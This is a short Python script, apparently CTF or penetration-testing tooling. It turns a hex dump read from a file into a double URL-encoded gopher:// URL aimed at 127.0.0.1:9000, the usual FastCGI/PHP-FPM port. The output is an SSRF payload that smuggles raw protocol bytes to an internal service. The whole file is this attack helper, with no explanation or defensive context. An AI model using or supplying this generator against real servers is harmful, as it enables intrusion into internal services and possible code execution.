import warnings
import urllib.parse
warnings.filterwarnings('ignore')

a=''
with open('hex.txt','r') as f:
    for i in f.readlines():
        i=i.strip('\n')
        a+=i
b=''
length=len(a)
for i in range(0,length,2):
    b+='%'
    b+=a[i]
    b+=a[i+1]
b=urllib.parse.quote(b)
print('gopher://127.0.0.1:9000/_'+b)
